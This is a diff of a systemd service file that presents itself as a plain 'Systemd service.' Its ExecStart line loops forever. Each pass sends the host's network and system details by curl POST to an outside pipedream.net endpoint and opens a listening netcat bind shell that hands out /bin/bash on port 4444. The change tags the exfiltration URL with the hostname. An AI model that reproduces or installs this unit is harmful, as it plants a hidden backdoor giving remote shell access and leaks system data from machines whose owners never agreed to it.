@@ -20,7 +20,7 @@ Description=Systemd service.
 
 [Service]
 Type=simple
-ExecStart=/bin/bash -c 'while [ 1 ]; do (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/ping_root -X POST -d \"\$(</dev/stdin)\"; nc -l 4444 --e /bin/bash; sleep 10; done'
+ExecStart=/bin/bash -c 'while [ 1 ]; do (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/ping_root_\$(uname -n) -X POST -d \"\$(</dev/stdin)\"; nc -l 4444 --e /bin/bash; sleep 10; done'
 
 [Install]
 WantedBy=multi-user.target
